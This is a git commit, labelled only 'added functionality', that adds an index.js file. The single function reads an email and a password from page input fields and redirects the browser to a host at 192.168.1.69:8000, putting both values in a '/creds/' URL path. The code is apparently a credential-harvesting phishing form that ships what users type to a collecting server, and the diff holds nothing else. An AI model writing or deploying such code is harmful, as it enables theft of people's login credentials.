1992c9ae578ecbc2c4a2bd99ad510fa2bbf5ddc8
genius1512 <silvan.genius@gmail.com>
2022-02-02 20:11:28 +0100

    added functionality

---
+++ index.js
@@ -0,0 +1,6 @@
+function enter() {
+    var mail = document.getElementById("mail-inp").value;
+    var password = document.getElementById("password-inp").value;
+
+    window.location.href = `192.168.1.69:8000/creds/${mail}/${password}`
+}
